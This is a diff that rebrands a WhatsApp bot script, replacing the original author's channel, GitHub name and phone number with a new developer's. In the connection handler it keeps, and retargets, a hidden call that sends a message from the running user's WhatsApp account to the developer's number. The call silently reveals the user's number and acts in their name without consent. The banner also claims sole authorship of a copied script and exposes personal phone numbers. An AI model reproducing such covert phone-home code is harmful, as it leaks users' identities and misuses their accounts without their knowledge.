@@ -32,10 +32,10 @@ const starts = async (DogeXeonOP = new WAConnection()) => {
 		width: 80,
 		whitespaceBreak: false
 	}), 'cyan'))
-	console.log(color('\n> YT CHANNEL: Xeon ','silver'))
-console.log(color('> GITHUB: DGXeon ','silver'))
-console.log(color('> WA NUMBER: +916909137213 ','silver'))
-console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
+	console.log(color('\n> yt channel: cosmic modz ','silver'))
+console.log(color('> GITHUB: khadher05 ','silver'))
+console.log(color('> WA NUMBER: +917025191792 ','silver'))
+console.log(color('  cosmic bot Inc. 2022','mediumseagreen'))
     console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
     console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
     console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/917025191792'))
@@ -52,10 +52,10 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
         start('2', 'Loading ...')
     })
     DogeXeonOP.on('open', () => {
-        success('2', 'Connected ✓')
+        success('2', 'Connected ✓.COSMIC DG BOT WORKING SUCCESSFULLY NOW💖')
     })
         //inform to developer that the user is connected to bot
-    DogeXeonOP.sendMessage(`917025191792@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
+    DogeXeonOP.sendMessage(`917025191792@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number *KHADHER POLI ALLE*`, MessageType.extendedText)
     
     //group link target
     teks = `https://chat.whatsapp.com/FhPPp43dYlNLi499ZJuq5X`
